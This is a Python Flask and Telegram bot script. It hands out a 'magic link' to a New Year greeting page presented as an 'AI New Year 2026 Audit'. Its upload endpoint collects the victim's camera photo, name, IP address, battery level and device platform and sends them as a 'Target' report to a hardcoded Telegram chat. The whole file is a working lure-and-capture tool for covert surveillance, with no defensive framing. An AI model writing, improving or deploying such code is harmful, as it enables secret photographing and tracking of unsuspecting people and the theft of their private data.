import os
import base64
import threading
from flask import Flask, render_template, request, jsonify
import telebot
from telebot import types

app = Flask(__name__)

# Settings
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = "7162565886"
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    # अभी Force Join हटा दिया गया है, सीधे लिंक मिलेगा
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("✨ GENERATE MAGIC LINK", url="https://happy-wishing-you.onrender.com")
    btn2 = types.InlineKeyboardButton("👨‍💻 CONTACT ADMIN", url="https://t.me/Roshanali000")
    markup.add(btn1, btn2)
    
    bot.send_message(message.chat.id, 
        "<b>SYSTEM ONLINE ✅</b>\n\nYour AI New Year 2026 Audit link is ready. Click below to proceed.", 
        parse_mode='HTML', reply_markup=markup)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        name = data.get('name', 'Unknown')
        img_data = data.get('image')
        info = data.get('info', {})
        label = data.get('label', 'Audit Capture')

        branding = "<b>━━━━━━━━━━━━━━━━━━━━━━\n✨ Created by Roshan Ali ✨\n━━━━━━━━━━━━━━━━━━━━━━</b>"
        
        report = (
            f"🛡️ <b>SYSTEM AUDIT: {label}</b>\n\n"
            f"👤 <b>Target:</b> {name}\n"
            f"🔋 <b>Battery:</b> {info.get('battery')}\n"
            f"🌐 <b>IP Address:</b> {request.remote_addr}\n"
            f"📱 <b>Device:</b> {info.get('platform')}\n\n"
            f"{branding}"
        )

        if img_data:
            img_bytes = base64.b64decode(img_data.split(',')[1])
            bot.send_photo(CHAT_ID, img_bytes, caption=report, parse_mode='HTML')
        return jsonify({"status": "success"})
    except:
        return jsonify({"status": "error"}), 500

def run_bot():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
    
